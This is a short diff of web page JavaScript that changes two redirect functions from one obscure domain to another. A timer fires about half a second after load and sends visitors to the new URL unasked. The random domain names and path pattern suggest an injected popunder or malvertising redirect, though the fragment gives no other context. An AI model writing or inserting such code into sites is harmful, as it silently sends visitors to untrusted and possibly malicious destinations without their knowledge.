@@ -5,8 +5,8 @@
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://dooloust.net/4/4697209";
+        location.href="https://whouphesaussums.net/4/8554813";
     }
     function goon(){
-        location.href="https://dooloust.net/4/4697209";
+        location.href="https://whouphesaussums.net/4/8554813";
     }
